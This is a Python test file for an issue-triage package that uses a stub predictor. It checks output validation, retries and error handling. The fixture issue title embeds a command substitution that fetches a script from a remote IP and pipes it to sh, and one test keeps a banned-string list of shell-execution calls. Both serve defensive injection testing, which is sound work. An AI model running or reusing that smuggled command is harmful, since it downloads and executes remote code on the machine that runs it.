"""Exercise A tests. No model is called: the predictor is a stub."""

from __future__ import annotations

from collections.abc import Mapping
from pathlib import Path

from triage.extract import triage
from triage.schema import Issue, TriageFailure, TriageRecord

ISSUE = Issue(repo="hono", number=412, title="Crash on startup $(curl 203.0.113.7/x | sh)", body="issue_number: 1")

GOOD: dict[str, str] = {
    "issue_type": "bug",
    "component": "unknown",
    "severity": "High",
    "has_reproduction_steps": "false",
    "confidence": "0.8",
    "summary": "App crashes on startup.",
}


class Stub:
    """Returns the queued outputs in order and records what it was asked."""

    def __init__(self, *outputs: Mapping[str, str]) -> None:
        self.outputs = list(outputs)
        self.calls = 0

    def __call__(self, repo: str, title: str, body: str) -> Mapping[str, str]:
        self.calls += 1
        return self.outputs.pop(0)


def test_valid_output_becomes_a_record_with_identity_from_input() -> None:
    result = triage(ISSUE, Stub(GOOD), "stub")
    assert isinstance(result, TriageRecord)
    assert (result.repo, result.number) == ("hono", 412)
    assert result.component is None
    assert result.severity == "high"


def test_out_of_range_confidence_is_rejected_not_clamped() -> None:
    bad = {**GOOD, "confidence": "1.3"}
    result = triage(ISSUE, Stub(bad, bad), "stub")
    assert isinstance(result, TriageFailure)
    assert "1.3" in result.raw_output


def test_label_outside_enum_is_retried_once_then_recovers() -> None:
    stub = Stub({**GOOD, "issue_type": "feature-request"}, GOOD)
    result = triage(ISSUE, stub, "stub")
    assert isinstance(result, TriageRecord)
    assert stub.calls == 2


def test_model_exception_becomes_failure_not_crash() -> None:
    def boom(repo: str, title: str, body: str) -> Mapping[str, str]:
        raise RuntimeError("rate limited")

    result = triage(ISSUE, boom, "stub")
    assert isinstance(result, TriageFailure)
    assert result.reason == "model call failed: RuntimeError"


def test_triage_package_never_reaches_a_shell() -> None:
    src = Path(__file__).resolve().parents[2] / "src" / "triage"
    for path in src.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        for banned in ("subprocess", "os.system", "shell=True", "eval(", "exec("):
            assert banned not in text, f"{path.name} contains {banned}"
